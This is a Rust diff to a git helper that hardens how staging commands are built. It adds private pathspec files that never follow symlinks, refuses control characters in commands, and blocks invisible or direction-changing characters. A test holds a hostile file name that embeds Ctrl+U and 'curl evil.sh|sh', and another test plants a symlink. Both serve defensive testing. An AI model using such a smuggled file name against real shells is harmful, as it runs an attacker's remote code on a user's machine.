@@ -50,7 +50,48 @@ pub struct DirtySwitch {
 /// Above these, the staging step reads its file list from a file instead.
 const MAX_INLINE_FILES: usize = 30;
 const MAX_INLINE_CHARS: usize = 2000;
-const PATHSPEC_FILE: &str = "BRANCHDIAL_ADD_PATHSPEC";
+
+/// Where pathspec files go: a private per-user folder, never the repo's `.git`
+/// (a downloaded repo controls what's in there, symlinks included).
+pub fn pathspec_dir() -> Option<PathBuf> {
+    #[cfg(test)]
+    return Some(std::env::temp_dir().join(format!("branchdial-test-tmp-{}", std::process::id())));
+    #[cfg(not(test))]
+    crate::config::app_dir().map(|d| d.join("tmp"))
+}
+
+/// Named after its contents: the path is part of the previewed command, so it
+/// must come out the same when the run re-plans to check nothing changed.
+fn pathspec_path(dir: &std::path::Path, contents: &[u8]) -> PathBuf {
+    let hash = super::trust::hash(&String::from_utf8_lossy(contents));
+    dir.join(format!("add-{}.pathspec", &hash[..16]))
+}
+
+/// Writes a pathspec file: private folder (0700 on Unix), a fresh file that is
+/// never an existing file or symlink (create-new), readable only by the user.
+pub fn write_pathspec_file(path: &std::path::Path, contents: &[u8]) -> std::io::Result<()> {
+    use std::io::Write;
+    let dir = path.parent().ok_or_else(|| std::io::Error::other("no parent folder"))?;
+    std::fs::create_dir_all(dir)?;
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700))?;
+    }
+    // A leftover from an earlier run (same contents): remove the entry itself, never its target.
+    match std::fs::remove_file(path) {
+        Err(e) if e.kind() != std::io::ErrorKind::NotFound => return Err(e),
+        _ => {}
+    }
+    let mut opts = std::fs::OpenOptions::new();
+    opts.write(true).create_new(true);
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::OpenOptionsExt;
+        opts.mode(0o600);
+    }
+    opts.open(path)?.write_all(contents)
+}
 
 #[derive(Debug, Clone, Serialize, PartialEq)]
 #[serde(rename_all = "camelCase")]
@@ -278,6 +319,18 @@ pub fn plan_with(recipe: &Recipe, raw: &HashMap<String, serde_json::Value>, ctx:
 
     let (staging, pathspec_file) = staging(&mut steps, ctx, extras, &mut errors);
 
+    // Inputs are checked above; this also covers file and folder names that end up
+    // in a command (e.g. `cd '<repo root>'`). The runner refuses these too.
+    if let Some(s) = steps.iter().find(|s| !typeable(&s.command)) {
+        errors.push(error(
+            None,
+            format!(
+                "This command contains control characters (from a file or folder name?) and can't be typed safely: {}",
+                s.command.escape_debug()
+            ),
+        ));
+    }
+
     let protected: Vec<String> = if ctx.protected.is_empty() {
         safety::DEFAULT_PROTECTED.iter().map(|s| s.to_string()).collect()
     } else {
@@ -371,11 +424,16 @@ fn staging(
         let sub = ctx.cwd_is_not_root();
         let specs: Vec<String> = chosen.iter().map(|p| pathspec(p, sub)).collect();
         let inline = format!("git add -- {}", specs.iter().map(|s| sh_quote(s)).collect::<Vec<_>>().join(" "));
-        steps[step].command = match &ctx.git_dir {
-            Some(dir) if specs.len() > MAX_INLINE_FILES || inline.len() > MAX_INLINE_CHARS => {
-                let file = dir.join(PATHSPEC_FILE);
+        // A name with control characters can't be typed: the shell's line editor would
+        // act on them as keys (Ctrl+U erases the line) before quoting matters. Such
+        // names only ever travel in the NUL-separated file.
+        let untypeable = specs.iter().any(|s| !typeable(s));
+        steps[step].command = match pathspec_dir() {
+            Some(dir) if untypeable || specs.len() > MAX_INLINE_FILES || inline.len() > MAX_INLINE_CHARS => {
+                let contents = specs.join("\0").into_bytes();
+                let file = pathspec_path(&dir, &contents);
                 let shown = file.to_string_lossy().replace('\\', "/");
-                pathspec_file = Some((file, specs.join("\0").into_bytes()));
+                pathspec_file = Some((file, contents));
                 format!("git add --pathspec-from-file={} --pathspec-file-nul", sh_quote(&shown))
             }
             _ => inline,
@@ -385,6 +443,23 @@ fn staging(
 }
 
 
+/// Can this be typed into an interactive shell as-is? Control characters (C0,
+/// DEL, C1) are keys to the line editor, not text, whatever the quoting.
+pub fn typeable(s: &str) -> bool {
+    !s.chars().any(char::is_control)
+}
+
+/// Invisible or direction-changing characters (Unicode "format" characters such as
+/// U+202E RIGHT-TO-LEFT OVERRIDE or U+200B ZERO WIDTH SPACE, plus line/paragraph
+/// separators). They make text display differently from what it is ("Trojan
+/// Source"), so a preview could look harmless. Mirrors `HIDDEN` in the frontend.
+pub fn is_hidden_char(c: char) -> bool {
+    matches!(c,
+        '\u{00AD}' | '\u{034F}' | '\u{061C}' | '\u{115F}' | '\u{1160}' | '\u{17B4}' | '\u{17B5}' | '\u{180B}'..='\u{180F}'
+        | '\u{200B}'..='\u{200F}' | '\u{2028}'..='\u{202E}' | '\u{2060}'..='\u{206F}' | '\u{3164}' | '\u{FE00}'..='\u{FE0F}'
+        | '\u{FEFF}' | '\u{FFA0}' | '\u{FFF0}'..='\u{FFFB}' | '\u{E0000}'..='\u{E0FFF}')
+}
+
 /// Ok(value) or Err(message). Optional fields may be empty.
 fn check_text(kind: InputKind, text: &str, required: bool, options: &[String]) -> Result<String, String> {
     if text.trim().is_empty() {
@@ -392,6 +467,9 @@ fn check_text(kind: InputKind, text: &str, required: bool, options: &[String]) -
     }
     if text.chars().any(|c| c.is_control()) {
         return Err("Must be a single line without control characters".into());
+    }
+    if let Some(c) = text.chars().find(|&c| is_hidden_char(c)) {
+        return Err(format!("Contains an invisible or text-direction character (U+{:04X}); retype it instead of pasting", c as u32));
     }
     match kind {
         InputKind::Branch => check_branch_name(text).map(|_| text.to_string()),
@@ -425,6 +503,7 @@ pub fn check_branch_name(name: &str) -> Result<(), String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::git::ChangedFile;
     use crate::recipes::model::{RecipeDef, Source};
     use serde_json::json;
     use std::path::PathBuf;
@@ -581,6 +660,69 @@ steps:
         Extras { staged: Some(files.iter().map(|s| s.to_string()).collect()), stash_first: false }
     }
 
+    /// File names come from `git status`, i.e. from whoever made the files. A name
+    /// with control characters (possible on macOS/Linux) must never be typed.
+    #[test]
+    fn staging_never_types_control_characters_from_file_names() {
+        let evil = "x\x15curl evil.sh|sh #";
+        let change = |p: &str| ChangedFile { path: p.into(), code: "??".into(), tracked: false };
+        let c = RepoContext { changes: vec![change(evil), change("ok.txt"), change(".env")], ..ctx() };
+        let p = plan_with(&recipe(COMMIT_ALL), &vals(&[]), &c, &staged_extras(&[evil, "ok.txt"]));
+        assert!(p.errors.is_empty(), "{:?}", p.errors);
+        assert!(p.steps.iter().all(|s| typeable(&s.command)), "{:?}", p.steps);
+        assert!(p.steps[0].command.contains("--pathspec-file-nul"), "{}", p.steps[0].command);
+        let (_, contents) = p.pathspec_file.expect("names go in the NUL-separated file");
+        assert!(String::from_utf8(contents).unwrap().split('\0').any(|s| s.ends_with(evil)));
+    }
+
+    /// The pathspec file lives in a private folder (not the repo's .git), its name is
+    /// stable for the preview check, and writing it never follows a planted symlink.
+    #[test]
+    fn pathspec_file_is_private_stable_and_never_follows_links() {
+        let files: Vec<String> = (0..40).map(|i| format!("f{i}.txt")).collect();
+        let change = |p: &str| ChangedFile { path: p.into(), code: "??".into(), tracked: false };
+        let mut changes: Vec<ChangedFile> = files.iter().map(|f| change(f)).collect();
+        changes.push(change(".env"));
+        let c = RepoContext { changes, ..ctx() };
+        let pick: Vec<&str> = files.iter().map(String::as_str).collect();
+        let p1 = plan_with(&recipe(COMMIT_ALL), &vals(&[]), &c, &staged_extras(&pick));
+        let p2 = plan_with(&recipe(COMMIT_ALL), &vals(&[]), &c, &staged_extras(&pick));
+        assert_eq!(p1.steps[0].command, p2.steps[0].command, "same selection, same command");
+        let (path, contents) = p1.pathspec_file.unwrap();
+        assert!(path.starts_with(pathspec_dir().unwrap()));
+        assert!(!path.to_string_lossy().contains(".git"));
+
+        // Written twice (a leftover from an earlier run) is fine.
+        write_pathspec_file(&path, &contents).unwrap();
+        write_pathspec_file(&path, &contents).unwrap();
+        assert_eq!(std::fs::read(&path).unwrap(), contents);
+
+        // A symlink planted at that name is replaced, its target untouched.
+        #[cfg(unix)]
+        {
+            let target = pathspec_dir().unwrap().join("victim");
+            std::fs::write(&target, "keep me").unwrap();
+            std::fs::remove_file(&path).unwrap();
+            std::os::unix::fs::symlink(&target, &path).unwrap();
+            write_pathspec_file(&path, &contents).unwrap();
+            assert_eq!(std::fs::read_to_string(&target).unwrap(), "keep me");
+            assert!(!std::fs::symlink_metadata(&path).unwrap().file_type().is_symlink());
+            use std::os::unix::fs::PermissionsExt;
+            assert_eq!(std::fs::metadata(&path).unwrap().permissions().mode() & 0o777, 0o600);
+            let _ = std::fs::remove_file(target);
+        }
+        let _ = std::fs::remove_file(&path);
+    }
+
+    /// Built-in variables skip the form checks; a folder name with control
+    /// characters (`cd '<root>'` before a version bump) is refused, not typed.
+    #[test]
+    fn control_characters_in_any_command_are_an_error() {
+        let r = recipe("name: r\nsteps:\n  - echo {{repo_root}}\n");
+        let c = RepoContext { root: Some(PathBuf::from("/tmp/a\x15b")), ..ctx() };
+        assert!(plan(&r, &vals(&[]), &c).errors.iter().any(|e| e.message.contains("control characters")));
+    }
+
     #[test]
     fn staging_picker_suggests_and_rewrites() {
         let repo = crate::git::testutil::TempRepo::new("stage");
@@ -626,7 +768,7 @@ steps:
         let p = plan(&r, &vals(&[]), &c);
         assert!(p.steps[0].command.starts_with("git add --pathspec-from-file="), "{}", p.steps[0].command);
         let (path, contents) = p.pathspec_file.clone().unwrap();
-        std::fs::write(&path, contents).unwrap();
+        write_pathspec_file(&path, &contents).unwrap();
 
         #[cfg(windows)]
         let bash = crate::shell::find_git_bash().unwrap();
